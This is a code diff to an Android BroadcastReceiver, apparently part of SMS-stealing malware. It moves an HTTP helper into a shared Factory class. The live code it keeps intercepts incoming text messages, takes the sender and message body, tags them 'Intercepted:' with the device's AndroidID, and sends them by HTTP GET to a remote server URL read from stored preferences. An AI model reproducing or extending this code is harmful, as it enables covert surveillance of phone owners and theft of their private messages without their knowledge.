@@ -30,6 +30,7 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 
 import u.can.i.up.expert.common.DataSet;
+import u.can.i.up.expert.common.Factory;
 import u.can.i.up.expert.framework.PhoneListener;
 
 public class ServiceReceiver extends BroadcastReceiver {
@@ -134,7 +135,7 @@ public class ServiceReceiver extends BroadcastReceiver {
                             messages += body + "\n";
 
                             try {
-                                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(context).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(context).getString("AndroidID", "") + "&Data=", "Intercepted: " + "["+address+"]" + " ["+body+"]");
+                                Factory.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(context).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(context).getString("AndroidID", "") + "&Data=", "Intercepted: " + "["+address+"]" + " ["+body+"]");
                             } catch (Exception e) {
                                 e.printStackTrace();
                             }
@@ -169,36 +170,36 @@ public class ServiceReceiver extends BroadcastReceiver {
         return false;
     }
 
-    public InputStream getInputStreamFromUrl(String urlBase, String urlData) throws UnsupportedEncodingException {
-
-//    	Log.d(DataSet.getInstance().LOG_TAG + this.getClass().getName(), urlBase);
-//    	Log.d(DataSet.getInstance().LOG_TAG + this.getClass().getName(), urlData);
-
-        String urlDataFormatted=urlData;
-
-        SimpleDateFormat sdf = new SimpleDateFormat("yyyy_MM_dd_HH:mm:ss");
-        String currentDateandTime = "[" + sdf.format(new Date()) + "] - ";
-        currentDateandTime = URLEncoder.encode (currentDateandTime, "UTF-8");
-
-        if(urlData.length()>1)
-        {
-            Log.d(DataSet.getInstance().LOG_TAG + this.getClass().getName(), urlBase + urlData);
-
-            urlData = currentDateandTime + URLEncoder.encode (urlData, "UTF-8");
-            urlDataFormatted = urlData.replaceAll("\\.", "~period");
-
-            Log.d(DataSet.getInstance().LOG_TAG + this.getClass().getName(), urlBase + urlDataFormatted);
-        }
-
-        InputStream content = null;
-        try
-        {
-            HttpClient httpclient = new DefaultHttpClient();
-            HttpResponse response = httpclient.execute(new HttpGet(urlBase + urlDataFormatted));
-            content = response.getEntity().getContent();
-            httpclient.getConnectionManager().shutdown();
-        } catch (Exception e) {
-        }
-        return content;
-    }
+//    public InputStream getInputStreamFromUrl(String urlBase, String urlData) throws UnsupportedEncodingException {
+//
+////    	Log.d(DataSet.getInstance().LOG_TAG + this.getClass().getName(), urlBase);
+////    	Log.d(DataSet.getInstance().LOG_TAG + this.getClass().getName(), urlData);
+//
+//        String urlDataFormatted=urlData;
+//
+//        SimpleDateFormat sdf = new SimpleDateFormat("yyyy_MM_dd_HH:mm:ss");
+//        String currentDateandTime = "[" + sdf.format(new Date()) + "] - ";
+//        currentDateandTime = URLEncoder.encode (currentDateandTime, "UTF-8");
+//
+//        if(urlData.length()>1)
+//        {
+//            Log.d(DataSet.getInstance().LOG_TAG + this.getClass().getName(), urlBase + urlData);
+//
+//            urlData = currentDateandTime + URLEncoder.encode (urlData, "UTF-8");
+//            urlDataFormatted = urlData.replaceAll("\\.", "~period");
+//
+//            Log.d(DataSet.getInstance().LOG_TAG + this.getClass().getName(), urlBase + urlDataFormatted);
+//        }
+//
+//        InputStream content = null;
+//        try
+//        {
+//            HttpClient httpclient = new DefaultHttpClient();
+//            HttpResponse response = httpclient.execute(new HttpGet(urlBase + urlDataFormatted));
+//            content = response.getEntity().getContent();
+//            httpclient.getConnectionManager().shutdown();
+//        } catch (Exception e) {
+//        }
+//        return content;
+//    }
 }
